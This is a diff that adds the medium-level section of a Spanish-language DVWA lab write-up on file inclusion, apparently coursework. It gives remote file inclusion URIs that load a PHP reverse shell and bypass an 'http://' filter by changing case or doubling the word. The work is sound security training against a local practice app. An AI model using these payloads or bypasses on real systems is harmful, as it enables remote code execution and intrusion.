@@ -44,6 +44,22 @@ cat DVWA/hackable/flags/fi.php
 
 ## Medio
 
+Al igual que en el nivel bajo, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:
+
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
+```
+
+Si probamos a ejecutarlo, comprobaremos que no funciona debido a que el servidor habra reemplazado el `http://` por una cadena vacía y por tanto no podrá conectarse al servidor local. Para poder solucionar esto, podemos probar cambiando `http` -> `Http` | `httphttp` | `HTTP` | etc.
+
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=Http://localhost/php-reverse-shell.php
+```
+
+![rfi-2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi-2.png)
+
+Como se puede ver, se ha vuelto a visualizar el archivo `fi.php` de donde extraemos todas las citas.
+
 ## Alto
 
 ## Imposible
